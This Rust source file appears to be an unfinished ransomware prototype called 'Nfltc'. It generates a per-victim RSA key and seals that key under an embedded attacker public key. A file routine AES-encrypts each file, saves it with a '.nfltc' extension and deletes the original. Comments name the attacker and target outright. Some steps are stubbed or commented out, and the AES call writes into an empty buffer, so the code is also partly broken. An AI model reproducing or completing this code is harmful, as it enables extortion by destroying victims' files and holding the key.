use std::fs::remove_file;
use std::path::PathBuf;
use std::{path::Path, fs::File};
use std::io::{Result, Write, Read};
use openssl::aes::{AesKey, aes_ige};
use openssl::cipher;
use openssl::rand::rand_bytes;
use openssl::symm::Mode;
use openssl::{rsa::{Rsa, Padding}, pkey::{Private, Public}};

const ATK_RSA: &[u8] = include_bytes!("../tests/keys/public.pem");
const TRG_RSA_FILE: &str = "./tests/test_dirs/DO_NOT_REMOVE";
const RSA_SIZE: usize = 2048;
const ENCRYPTED_FILE_EXT: &str = ".nfltc";

struct Nfltc {
    trg_rsa: Rsa<Private>,
}

impl Nfltc {
    pub fn new() -> Self {
        Self {
            trg_rsa: Rsa::generate(RSA_SIZE as u32)
                .expect("Failed to generate target RSA key."),
        }
    }

    pub fn export_trg_rsa(
        &self,
        atk_rsa_pub_pem: &[u8],
        trg_rsa_file: &str,
    ) -> Result<()> {
        // load attacker's public key
        let atk_rsa = Rsa::public_key_from_pem(atk_rsa_pub_pem)
            .expect("Invalid attacker's RSA public key.");
        
        // encrypt target's public key
        let trg_rsa_pem = self.trg_rsa.private_key_to_pem().expect("");
        let mut enc_trg_rsa_pem = vec![0u8; trg_rsa_pem.len()];
        atk_rsa.public_encrypt(&trg_rsa_pem, &mut enc_trg_rsa_pem, Padding::PKCS1_OAEP).unwrap();

        // export cipher to file
        let mut file = File::create(trg_rsa_file).unwrap();
        file.write_all(&enc_trg_rsa_pem).unwrap();
        Ok(())
    }

    pub fn encrypt_file(&self, plain_path: &str) {
        // generate aes key
        let mut aes_bytes = [0u8; 32 + 32];
        rand_bytes(&mut aes_bytes).unwrap();
        let aes = AesKey::new_encrypt(&aes_bytes[0..32]).unwrap();

        // encrypt aes key with target rsa public key
        // write encrypted aes key to file

        // read plain text file
        let mut plain_text = Vec::new();
        let mut plain_file = File::open(plain_path).unwrap();
        plain_file.read_to_end(&mut plain_text).unwrap();

        // encrypt plain text with aes key
        let mut cipher_text = Vec::new();
        aes_ige(&plain_text, &mut cipher_text, &aes, &mut aes_bytes[32..64], Mode::Encrypt);

        // write cipher text to file
        let cipher_path: String = format!("{}{}", plain_path, ENCRYPTED_FILE_EXT);
        let mut cipher_file = File::create(&cipher_path).unwrap();
        cipher_file.write_all(&cipher_text).unwrap();

        // remove original file
        remove_file(plain_path).unwrap();
    }
}

fn main() {
    let nfltc = Nfltc::new();
    // nfltc.export_trg_rsa(ATK_RSA, TRG_RSA_FILE);
}
